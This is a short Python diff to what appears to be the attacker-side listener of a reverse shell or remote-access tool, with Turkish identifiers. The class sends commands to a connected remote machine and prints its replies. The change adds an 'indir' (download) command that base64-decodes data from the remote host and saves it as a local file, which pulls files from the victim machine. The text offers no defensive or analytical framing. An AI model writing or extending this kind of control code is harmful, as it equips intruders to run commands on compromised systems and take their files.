@@ -1,5 +1,6 @@
 import socket
 import simplejson
+import base64
 
 class Lister:
     def __init__(self,ip,port):
@@ -35,6 +36,10 @@ class Lister:
             giris = giris.split(" ")
             self.paketleme(giris)
             cikti = self.paket_coz()
+            if giris[0]=="indir":
+                with open(giris[1],"wb") as dosya:
+                    dosya.write(base64.b64decode(cikti))
+                cikti = giris[1]+" inidirildi."
             print(cikti)
 
 
